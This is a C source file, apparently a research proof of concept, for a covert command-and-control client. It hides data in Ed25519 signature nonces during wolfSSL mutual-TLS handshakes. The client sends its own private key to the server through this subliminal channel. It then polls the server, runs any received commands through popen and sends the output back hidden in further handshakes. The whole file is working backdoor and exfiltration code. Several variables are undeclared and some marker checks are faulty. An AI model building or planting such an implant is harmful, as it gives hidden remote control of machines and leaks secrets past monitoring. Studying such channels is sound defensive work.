#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "wolfssl-5.8.4/wolfssl/options.h"
#include "wolfssl-5.8.4/wolfssl/ssl.h"
#include "wolfssl-5.8.4/wolfssl/wolfcrypt/ed25519.h"
#include <wolfssl/wolfcrypt/libwolfssl_sources.h>
#include <wolfssl/wolfcrypt/sha512.h>
#include <wolfssl/wolfcrypt/ge_operations.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8443
#define CLIENT_CERT "./certs/client-cert.pem"
#define CLIENT_KEY  "./certs/client-key.pem"
#define CA_CERT     "./certs/ca-cert.pem"

const char *http_request = 
    "GET / HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Connection: close\r\n"
    "\r\n";

#define MAX_LINE 256
#define MAX_B64_SIZE 4096

unsigned char raw_key[32] = {0x00};
unsigned char raw_key_output[64] = {0x00};

unsigned char server_key[32] = {0x00};
unsigned char server_key_n[64] = {0x00};

//BUFFER_SIZE definitions always refer to size in bytes
#define TX_BUFFER_SIZE 1024
#define RX_BUFFER_SIZE 1024

struct SubliminalBuffer {
    unsigned char tx_buffer_b[TX_BUFFER_SIZE];
    unsigned char tx_buffer_n[TX_BUFFER_SIZE * 2];
    int tx_buffer_len;
    int tx_buffer_index;
    char tx_type;

    unsigned char rx_buffer_b[RX_BUFFER_SIZE];
    unsigned char rx_buffer_n[RX_BUFFER_SIZE * 2];
    int rx_buffer_len;
    int rx_buffer_index;
    char rx_type;
};

#define COMMAND_BUFFER_SIZE 1024
#define COMMAND_START 0xA0, 0xA0
#define COMMAND_END 0xF0, 0xF1
#define COMMAND_EXECUTE 0xC1
#define COMMAND_DATA 0xC2
#define COMMAND_KEY_EX 0xB1

struct Command {
    unsigned char line_input[COMMAND_BUFFER_SIZE];
    unsigned char c_buffer_b[COMMAND_BUFFER_SIZE];
    unsigned char c_buffer_n[COMMAND_BUFFER_SIZE * 2];
    int c_buffer_len;

    unsigned char c_start[2];
    unsigned char c_end[2];
    unsigned char c_exec;
    unsigned char c_keyex;
    char channel;
};

int derive_r_value(
    byte* r_out,
    const byte* signature,
    const byte* public_key,
    const byte* private_key_seed,
    const byte* message,
    word32 message_len
)
{
    wc_Sha512 sha;
    byte hash[64];
    byte priv_hash[64];
    byte scalar_a[32];
    byte h[32];
    byte ha[32];
    byte neg_ha[32];

    const byte* R = signature;
    const byte* S = signature + 32;

    /* Ed25519 group order L (little-endian) */
    static const byte L[32] = {
        0xed, 0xd3, 0xf5, 0x5c, 0x1a, 0x63, 0x12, 0x58,
        0xd6, 0x9c, 0xf7, 0xa2, 0xde, 0xf9, 0xde, 0x14,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10
    };

    /* -------------------------------------------------- */
    /* 1. Derive scalar a from seed                        */
    /* -------------------------------------------------- */
    wc_InitSha512(&sha);
    wc_Sha512Update(&sha, private_key_seed, 32);
    wc_Sha512Final(&sha, priv_hash);
    wc_Sha512Free(&sha);

    memcpy(scalar_a, priv_hash, 32);
    scalar_a[0]  &= 248;
    scalar_a[31] &= 127;
    scalar_a[31] |= 64;

    /* -------------------------------------------------- */
    /* 2. Compute h = H(R || A || M) mod L                 */
    /* -------------------------------------------------- */
    wc_InitSha512(&sha);
    wc_Sha512Update(&sha, R, 32);
    wc_Sha512Update(&sha, public_key, 32);
    wc_Sha512Update(&sha, message, message_len);
    wc_Sha512Final(&sha, hash);
    wc_Sha512Free(&sha);

    sc_reduce(hash);        /* reduces 64 → 32 */
    memcpy(h, hash, 32);

    /* -------------------------------------------------- */
    /* 3. Compute h·a                                     */
    /* ha = h * a mod L                                   */
    /* -------------------------------------------------- */
    sc_muladd(ha, h, scalar_a, (byte[32]){0});

    /* -------------------------------------------------- */
    /* 4. Compute −(h·a) = L − ha                          */
    /* -------------------------------------------------- */
    int borrow = 0;
    for (int i = 0; i < 32; i++) {
        int diff = (int)L[i] - (int)ha[i] - borrow;
        if (diff < 0) {
            diff += 256;
            borrow = 1;
        } else {
            borrow = 0;
        }
        neg_ha[i] = (byte)diff;
    }

    /* -------------------------------------------------- */
    /* 5. r = S + (−h·a) mod L                             */
    /* -------------------------------------------------- */
    sc_muladd(r_out, neg_ha, (byte[32]){1}, S);

    return 0;
}


int read_eddsa_private_key(const char *filename, unsigned char *raw_key) {
    FILE *fp;
    char line[MAX_LINE];
    char b64_data[MAX_B64_SIZE] = {0};
    unsigned char decoded[MAX_B64_SIZE];
    word32 decoded_len = MAX_B64_SIZE;
    
    fp = fopen(filename, "r");
    if (!fp) {
        fprintf(stderr, "Error opening file: %s\n", filename);
        return -1;
    }
    
    // Read and concatenate all base64 lines (skip BEGIN/END)
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "-") || strstr(line, "-")) {
            continue;
        }
        line[strcspn(line, "\r\n")] = 0;  // Remove newline
        strcat(b64_data, line);
    }
    fclose(fp);
    
    // Base64 decode
    if (Base64_Decode((const byte*)b64_data, strlen(b64_data), decoded, &decoded_len) != 0) {
        fprintf(stderr, "Error decoding base64\n");
        return -1;
    }
    
    // Extract the 32-byte Ed25519 key (last 32 bytes of DER structure)
    memcpy(raw_key, decoded + decoded_len - 32, 32);
    
    return 0;
}

void convert_to_bytes(unsigned char *in, unsigned char *out, int len){

    for (int i = 0; i < len / 2; i++) {
    out[i] = (in[i * 2] << 4) | in[i * 2 + 1];
    }
    
    return;

}

void convert_to_nibbles(unsigned char *bytes, size_t bytes_len, unsigned char *nibbles) {
    for (size_t i = 0; i < bytes_len; i++) {
        nibbles[i * 2] = (bytes[i] >> 4) & 0x0F;      // High nibble
        nibbles[i * 2 + 1] = bytes[i] & 0x0F;         // Low nibble
    }
}

int exec_command(struct Command *input, struct SubliminalBuffer *buffer){
    printf("exec command: %s", input->line_input);

    FILE *fp;
    size_t bytes_read = 0;
    
    // Open pipe for reading
    fp = popen((char *)input->line_input, "r");
    if (fp == NULL) {
        return -1;
    }
    
    //add control headers to buffer
    unsigned char t[2] = {COMMAND_START};
    memcpy(buffer->tx_buffer_b, t, 2);
    buffer->tx_buffer_b[2] = COMMAND_DATA;
    buffer->tx_buffer_len+=3;

    // Read output into the buffer
    bytes_read = fread(&buffer->tx_buffer_b[3], 1, 256 - 1, fp);
    buffer->tx_buffer_b[bytes_read+3] = '\0';  // Null terminate
    buffer->tx_buffer_len += bytes_read + 1;

    //if we executed a command that doesn't write anything to stdout
    if(bytes_read == 0){
        buffer->tx_buffer_b[3] = 'o';
        buffer->tx_buffer_b[4] = 'k';
        buffer->tx_buffer_b[5] = '\n';
        buffer->tx_buffer_b[6] = '\0';
        buffer->tx_buffer_len +=4;
    }

    //add control end to buffer
    unsigned char t2[2] = {COMMAND_END};
    memcpy(&buffer->tx_buffer_b[buffer->tx_buffer_len], t2, 2);
    buffer->tx_buffer_len += 2;
    buffer->tx_buffer_index = 0;

    printf("formatted cmd output: ");
    for(int i = 0; i <buffer->tx_buffer_len; i++)
        printf("%c", buffer->tx_buffer_b[i]);
    printf("\n");

    //format if narrowband
    if(buffer->tx_type == 'n'){
        convert_to_nibbles(buffer->tx_buffer_b, buffer->tx_buffer_len, buffer->tx_buffer_n);
        buffer->tx_buffer_len*=2;
        printf("nibble output:");
        for(int i =0; i <buffer->tx_buffer_len; i++)
            printf("%x", buffer->tx_buffer_n[i]);

        printf("\n");
    }
    // Close pipe and get exit status
    int status = pclose(fp);
    
    //clear line input
    memset(input->line_input, 0x00, COMMAND_BUFFER_SIZE);

    //clear rx buffer
    memset(buffer->rx_buffer_b, 0x00, RX_BUFFER_SIZE);
    memset(buffer->rx_buffer_n, 0x00, RX_BUFFER_SIZE*2);
    buffer->rx_buffer_len = 0;
    buffer->rx_buffer_index = 0;

    return status;
}

void cleanup(WOLFSSL_CTX *ctx, WOLFSSL *ssl, int sockfd) {
    if (ssl) {
        wolfSSL_shutdown(ssl);
        wolfSSL_free(ssl);
    }
    if (sockfd >= 0) close(sockfd);
    if (ctx) wolfSSL_CTX_free(ctx);
    wolfSSL_Cleanup();
}

WOLFSSL_CTX* init_client_ctx() {
    WOLFSSL_CTX *ctx;
    
    wolfSSL_Init();
    
    ctx = wolfSSL_CTX_new(wolfTLSv1_3_client_method());
    if (!ctx) {
        fprintf(stderr, "Failed to create SSL context\n");
        return NULL;
    }
    
    // Load client certificate (for mutual TLS)
    if (wolfSSL_CTX_use_certificate_file(ctx, CLIENT_CERT, SSL_FILETYPE_PEM) != SSL_SUCCESS) {
        fprintf(stderr, "Failed to load %s\n", CLIENT_CERT);
        wolfSSL_CTX_free(ctx);
        return NULL;
    }
    
    // Load client private key (for mutual TLS)
    if (wolfSSL_CTX_use_PrivateKey_file(ctx, CLIENT_KEY, SSL_FILETYPE_PEM) != SSL_SUCCESS) {
        fprintf(stderr, "Failed to load %s\n", CLIENT_KEY);
        wolfSSL_CTX_free(ctx);
        return NULL;
    }
    
    // Load CA certificate for server verification
    if (wolfSSL_CTX_load_verify_locations(ctx, CA_CERT, NULL) != SSL_SUCCESS) {
        fprintf(stderr, "Failed to load CA certificate: %s\n", CA_CERT);
        wolfSSL_CTX_free(ctx);
        return NULL;
    }
    
    // Verify server certificate (mutual TLS)
    wolfSSL_CTX_set_verify(ctx, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, NULL);
    
    printf("Client configured with mutual TLS (Ed25519)\n");
    return ctx;
}

int connect_to_server() {
    int sockfd;
    struct sockaddr_in servaddr;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        fprintf(stderr, "Socket creation failed\n");
        return -1;
    }
    
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(SERVER_PORT);
    servaddr.sin_addr.s_addr = inet_addr(SERVER_IP);
    
    if (connect(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) != 0) {
        fprintf(stderr, "Connection to server failed\n");
        close(sockfd);
        return -1;
    }
    
    printf("Connected to %s:%d\n", SERVER_IP, SERVER_PORT);
    return sockfd;
}

void parse_rx_buffer(struct SubliminalBuffer *buffer, struct Command *input){
    //convert the half bytes to bytes
    //figure out how to fix misalignment
    printf("parsing rx buffer len %d index %d\n", buffer->rx_buffer_len, buffer->rx_buffer_index);
    //for(int i = 0; i<buffer->rx_buffer_len;i++)
    //    printf("%x", buffer->rx_buffer_n[i]);

    //printf("\n");
    if(buffer->rx_buffer_len > (RX_BUFFER_SIZE - 32)){
        printf("rx buffer full, clearing\n");
        memset(buffer->rx_buffer_b, 0x00, RX_BUFFER_SIZE);
        memset(buffer->rx_buffer_n, 0x00, RX_BUFFER_SIZE*2);
        buffer->rx_buffer_len = 0;
        buffer->rx_buffer_index = 0;
    }

    if(buffer->rx_type == 'n'){
    unsigned char c_start[2] = {COMMAND_START};
    unsigned char c_end[2] = {COMMAND_END};
    
    int start, end = 0;

    for (int i = 0; i < (buffer->rx_buffer_len - 3); i++) {
        if( buffer->rx_buffer_n[i] == ((c_start[0] >> 4) & 0x0F) && buffer->rx_buffer_n[i+1] == (c_start[0] & 0x0F) ){
            if( buffer->rx_buffer_n[i+2] == ((c_start[1] >> 4) & 0x0F) && buffer->rx_buffer_n[i+3] == (c_start[1] & 0x0F) ){
                start = i + 4;
                printf("command sequence found\n");
                break;
            }
        }    
    }

    //if command sequence has been found, parse the rest of the buffer to find the finish sequence F0F1
    if(start != 0){
        for (int i = 0; i < (buffer->rx_buffer_len - 3); i++) {
            if( buffer->rx_buffer_n[i] == ((c_end[0] >> 4) & 0x0F) && buffer->rx_buffer_n[i+1] == (c_start[0] & 0x0F)){
                if( buffer->rx_buffer_n[i+2] == ((c_end[1] >> 4) & 0x0F) && buffer->rx_buffer_n[i+3] == (c_end[1] & 0x0F) ){
                    end = i;
                    printf("command end sequence found pos %d, %d\n", start, end);
                    break;
                }
            }  
        }
    }else{
        return;
    }

    if(end != 0){
        if(buffer->rx_buffer_n[start] == ((COMMAND_DATA >> 4) & 0x0F) && (buffer->rx_buffer_n[start+1] & 0x0F) == (COMMAND_DATA & 0x0F)){
            //c2 message
            printf("Received reply: ");
            //message[end_index] = 0x00;
            for(int i = start + 2; i < end; i+=2){
                printf("%c", (buffer->rx_buffer_n[i] << 4) | buffer->rx_buffer_n[i+ 1]);
            }
            printf(" after %d handshakes\n", buffer->rx_buffer_index);

            //clear rx buffer
            memset(buffer->rx_buffer_b, 0x00, RX_BUFFER_SIZE);
            memset(buffer->rx_buffer_n, 0x00, RX_BUFFER_SIZE * 2);
            buffer->rx_buffer_index = 0;
            buffer->rx_buffer_len = 0;
        }

        if(buffer->rx_buffer_n[start] == ((COMMAND_EXECUTE >> 4) & 0x0F) && (buffer->rx_buffer_n[start+1] & 0x0F) == (COMMAND_EXECUTE & 0x0F)){
                printf("Command received: ");
                // message[end_index] = 0x00;
                for(int i = start + 2; i < end; i+=2){
                    printf("%c", (buffer->rx_buffer_n[i] << 4) | buffer->rx_buffer_n[i+ 1]);
                }
                printf(" after %d handshakes\n", buffer->rx_buffer_index);

                for(int i = start + 2, j = 0; i < end; i+=2, j++){
                    input->line_input[j] = (buffer->rx_buffer_n[i] << 4) | buffer->rx_buffer_n[i+1];
                    printf("%c", input->line_input[j]);
                }
                printf("\n");

                //convert_to_bytes(&buffer->rx_buffer_n[start+2], buffer->rx_buffer_b, (end - (start + 2))/2);


                //memcpy(input->line_input, &buffer->rx_buffer_b[start + 1], end - (start+1));
                
                buffer->tx_type = 'n';
                exec_command(input, buffer);


                // clear rx buffer
                memset(buffer->rx_buffer_b, 0x00, RX_BUFFER_SIZE);
                memset(buffer->rx_buffer_n, 0x00, RX_BUFFER_SIZE * 2);
                buffer->rx_buffer_index = 0;
                buffer->rx_buffer_len = 0;
                buffer->rx_type = 'n';
        }

        //key exchange
        if(buffer->rx_buffer_n[start] == ((COMMAND_KEY_EX >> 4) & 0x0F) && (buffer->rx_buffer_n[start+1] & 0x0F) == (COMMAND_KEY_EX & 0x0F)){
            //c2 message
            printf("Received key exchange message: ");
            //message[end_index] = 0x00;
            for(int i = start + 2; i < end; i+=2){
                printf("%x", (buffer->rx_buffer_n[i] << 4) | buffer->rx_buffer_n[i+ 1]);
            }
            printf(" after %d handshakes\n", buffer->rx_buffer_index);
            memcpy(server_key_n, &buffer->rx_buffer_n[start+2], 64);
            convert_to_bytes(server_key_n, server_key, 64);
            //clear rx buffer
            memset(buffer->rx_buffer_b, 0x00, RX_BUFFER_SIZE);
            memset(buffer->rx_buffer_n, 0x00, RX_BUFFER_SIZE * 2);
            buffer->rx_buffer_index = 0;
            buffer->rx_buffer_len = 0;
            buffer->rx_type = 'b';

            //set broadband channel
            g_subliminal_type = 1;
            return;
        }

    }else{
        return;
    }
    }
    else if (buffer->rx_type == 'b'){
        memcpy(buffer->rx_buffer_n, buffer->rx_buffer_b, buffer->rx_buffer_len);
        convert_to_bytes(buffer->rx_buffer_n, buffer->rx_buffer_b, buffer->rx_buffer_len);
        unsigned char c_start[2] = {COMMAND_START};
        unsigned char c_end[2] = {COMMAND_END};
        int start, end = 0;
        /*
        printf("parsing bb buffer\n");
        for(int i = 0; i < 32; i++)
            printf("%02x,", buffer->rx_buffer_b[i]);

        printf("\n");
        */
        for (int i = 0; i < buffer->rx_buffer_len - 1; i++){
            if (buffer->rx_buffer_b[i] == c_start[0] && buffer->rx_buffer_b[i + 1] == c_start[1]){
                start = i + 2;
                printf("broadband command sequence found\n");
                break;
            }
        }

        // if command sequence has been found, parse the rest of the buffer to find the finish sequence F0F0
        if (start != 0){
            for (int i = 0; i < buffer->rx_buffer_len - 1; i++){
                if (buffer->rx_buffer_b[i] == c_end[0] && buffer->rx_buffer_b[i + 1] == c_end[1]){
                    end = i;
                    printf("broadband command finish sequence found\n");
                }
            }
        }
        else{
            return;
        }

        // parse the command
        if (end != 0){
            if (buffer->rx_buffer_b[start] == COMMAND_DATA){
                printf("Data received: ");
                // message[end_index] = 0x00;
                for (int i = start + 1; i < end; i++)
                {
                    printf("%c", buffer->rx_buffer_b[i]);
                }
                printf(" after %d handshakes\n", buffer->rx_buffer_index);

                // clear rx buffer
                memset(buffer->rx_buffer_b, 0x00, RX_BUFFER_SIZE);
                memset(buffer->rx_buffer_n, 0x00, RX_BUFFER_SIZE * 2);
                buffer->rx_buffer_index = 0;
                buffer->rx_buffer_len = 0;
            }else if (buffer->rx_buffer_b[start] == COMMAND_EXECUTE){
                printf("Command received: ");
                // message[end_index] = 0x00;
                for (int i = start + 1; i < end; i++)
                {
                    printf("%c", buffer->rx_buffer_b[i]);
                }
                printf(" after %d handshakes\n", buffer->rx_buffer_index);
                memcpy(input->line_input, &buffer->rx_buffer_b[start + 1], end - (start+1));
                
                exec_command(input, buffer);
                buffer->tx_type = 'b';

                // clear rx buffer
                memset(buffer->rx_buffer_b, 0x00, RX_BUFFER_SIZE);
                memset(buffer->rx_buffer_n, 0x00, RX_BUFFER_SIZE * 2);
                buffer->rx_buffer_index = 0;
                buffer->rx_buffer_len = 0;
            }
        }
    }

    return;

    


}

int send_request(struct SubliminalBuffer *buffer){
    int sockfd;
    WOLFSSL_CTX *ctx = NULL;
    WOLFSSL *ssl = NULL;
    char http_buffer[2048];
    int ret;
    int override;

    printf("Starting wolfSSL HTTPS client connection...\n");

    ctx = init_client_ctx();
    if (!ctx) {
        return EXIT_FAILURE;
    }
        
    sockfd = connect_to_server();
    if (sockfd < 0) {
        cleanup(ctx, NULL, -1);
        return EXIT_FAILURE;
    }
    
    //set nonce overrides
    if(buffer->tx_type == 'n' && buffer->tx_buffer_len > 0){
        override = wc_ed25519_SetNonceOverride(0, 0, 'n', buffer->tx_buffer_n[buffer->tx_buffer_index]);
        printf("\n nonce override for message %x set\n", buffer->tx_buffer_n[buffer->tx_buffer_index]);
    }else if(buffer->tx_type == 'b' && buffer->tx_buffer_len > 0){
        override = wc_ed25519_SetNonceOverride(&buffer->tx_buffer_b[buffer->tx_buffer_index], 31, 'b', 0);
        printf("setting override for message:");
        for(int i = 0; i < 32; i++)
            printf("%02x", buffer->tx_buffer_b[buffer->tx_buffer_index+i]);
        printf("\n");
    }else{
        override = wc_ed25519_SetNonceOverride(0, 0, 'x', 0);
    }

    ssl = wolfSSL_new(ctx);
    if (!ssl) {
        fprintf(stderr, "Failed to create SSL object\n");
        cleanup(ctx, NULL, sockfd);
        return EXIT_FAILURE;
    }
    
    wolfSSL_set_fd(ssl, sockfd);
        
    // TLS handshake
    ret = wolfSSL_connect(ssl);
    if (ret != SSL_SUCCESS) {
        int err = wolfSSL_get_error(ssl, ret);
        char error_string[80];
        wolfSSL_ERR_error_string(err, error_string);
        fprintf(stderr, "TLS handshake failed: %s\n", error_string);
        cleanup(ctx, ssl, sockfd);
        return EXIT_FAILURE;
    }

    printf("TLS handshake successful, version %s cipher %s\n", wolfSSL_get_version(ssl), wolfSSL_get_cipher(ssl));

    //read into buffer here
    //printf("Reading half-byte %x from client signature into narrowband buffer\n", nb_output);
    if(buffer->rx_type == 'n'){
        printf("reading message %x into rx buffer\n", nb_output);
        buffer->rx_buffer_n[buffer->rx_buffer_index] = nb_output;
        buffer->rx_buffer_index += 1;
        buffer->rx_buffer_len += 1;
    }

    //decode signature data
    if(buffer->rx_type == 'b'){
        
    printf("raw signature data:\n");
        for(int i = 0; i < 64; i++){
            printf("%02x", g_subliminal_data->signature[i]);
        }

        unsigned char decoded_msg[32] = {0};
        int decode = derive_r_value(decoded_msg, g_subliminal_data->signature, g_subliminal_data->public_key, server_key, g_subliminal_data->message, g_subliminal_data->message_length);
        
        
        printf("\ndecoded signature data:\n");
        for(int i = 0; i < 32; i++)
            printf("%02x", decoded_msg[i]);

        memcpy(&buffer->rx_buffer_b[buffer->rx_buffer_len], decoded_msg, 32);
        buffer->rx_buffer_len += 32;
    }

    // Check if server certificate was verified
    long verify_result = wolfSSL_get_verify_result(ssl);
    if (verify_result == 0){
        printf("Server certificate verified successfully (Ed25519/EdDSA)\n");
    }
    else{
        printf("WARNING: Server certificate verification failed (code: %ld)\n", verify_result);
    }
    printf("\n");

    // Send HTTP request
    printf("Sending HTTP request...\n");
    ret = wolfSSL_write(ssl, http_request, strlen(http_request));
    if (ret <= 0){
        fprintf(stderr, "Failed to write to server\n");
        cleanup(ctx, ssl, sockfd);
        return EXIT_FAILURE;
    }

    // Receive HTTP response
    printf("Receiving response...\n");
    memset(http_buffer, 0, sizeof(http_buffer));
    ret = wolfSSL_read(ssl, http_buffer, sizeof(http_buffer) - 1);
    if (ret > 0){
        printf("%s", http_buffer);
    }
    else{
        fprintf(stderr, "Failed to read from server\n");
    }

    cleanup(ctx, ssl, sockfd);
    printf("\nConnection closed\n");
    return 0;
}


int main() {

     //initialize buffers
    struct SubliminalBuffer buffer = { {0x00}, {0x00}, 0, 0, 'x', {0x00}, {0x00}, 0, 0, 'x'};
    //initialize c2 input buffer with command sequences
    struct Command input = { {0x00}, {0x00}, {0x00}, 0, {COMMAND_START}, {COMMAND_END}, COMMAND_EXECUTE, COMMAND_KEY_EX, 'x'};

    printf("Reading private key\n");
    
    if (read_eddsa_private_key(CLIENT_KEY, raw_key) == 0) {
        printf("Ed25519 private key loaded (32 bytes):\n");
        for (int i = 0; i < 32; i++) {
            printf("%02x", raw_key[i]);
        }
        printf("\n");
    } else {
        fprintf(stderr, "Failed to read private key\n");
        return 1;
    }

    //convert_private_key();

    int beat = 2;
    int demo_select = 0;
    int status;

    printf("Select demo: 1. Narrowband key exchange->Broadband C2 channel\n2. Narrowband C2 channel\n");
    scanf("%d", &demo_select);

    //demo 1. narrowband key exchange and listen for broadband c2
    if(demo_select == 1){
        printf("copying private key to narrowband buffer\n");
        unsigned char temp[3] = { COMMAND_START, COMMAND_KEY_EX};
        memcpy(buffer.tx_buffer_b, temp, 3);
        memcpy(&buffer.tx_buffer_b[3], raw_key, 32);
        unsigned char temp2[2] = {COMMAND_END};
        memcpy(&buffer.tx_buffer_b[35], temp2, 2);
        convert_to_nibbles(buffer.tx_buffer_b, 37, buffer.tx_buffer_n);
        buffer.tx_buffer_len = 74;
        buffer.tx_type = 'n';
        buffer.rx_type = 'n';
        g_subliminal_type = 0;

        while(1){
            if( (buffer.tx_buffer_index >= buffer.tx_buffer_len) && (buffer.tx_type != 'x') ){
                printf("tx buffer sent, clearing...\n");
                memset(buffer.tx_buffer_b, 0x00, TX_BUFFER_SIZE);
                memset(buffer.tx_buffer_n, 0x00, TX_BUFFER_SIZE*2);
                buffer.tx_buffer_len = 0;
                buffer.tx_buffer_index = -1;
                buffer.tx_type = 'x';
            }else if( (buffer.tx_buffer_index < buffer.tx_buffer_len) && (buffer.tx_type != 'x')){
                status = send_request(&buffer);
                if(buffer.tx_type == 'n')
                    buffer.tx_buffer_index++;
                else   
                    buffer.tx_buffer_index+=31;

                parse_rx_buffer(&buffer,&input);

            }
            
            if( buffer.tx_type == 'x' ){
                printf("tx buffer clear, polling server every %d seconds\n", beat);    
                sleep(beat);
                status = send_request(&buffer);
                if(status == 1)
                    return 1;
                parse_rx_buffer(&buffer,&input);
            }


        }
    }else if (demo_select == 2){
        g_subliminal_type = 0;
        buffer.tx_type = 'n';
        buffer.rx_type = 'n';
        beat = 0;
        while(1){
            if( (buffer.tx_buffer_index >= buffer.tx_buffer_len) && (buffer.tx_type != 'x') ){
                printf("tx buffer sent, clearing...\n");
                memset(buffer.tx_buffer_b, 0x00, TX_BUFFER_SIZE);
                memset(buffer.tx_buffer_n, 0x00, TX_BUFFER_SIZE*2);
                buffer.tx_buffer_len = 0;
                buffer.tx_buffer_index = -1;
                buffer.tx_type = 'x';
            }else if( (buffer.tx_buffer_index < buffer.tx_buffer_len) && (buffer.tx_type != 'x')){
                status = send_request(&buffer);
                if(buffer.tx_type == 'n')
                    buffer.tx_buffer_index++;
                else   
                    buffer.tx_buffer_index+=31;

                parse_rx_buffer(&buffer,&input);

            }
            
            if( buffer.tx_type == 'x' ){
                printf("tx buffer clear, polling server every %d seconds\n", beat);    
                sleep(beat);
                status = send_request(&buffer);
                if(status == 1)
                    return 1;
                parse_rx_buffer(&buffer,&input);
            }   
    }
}

    return 0;
}
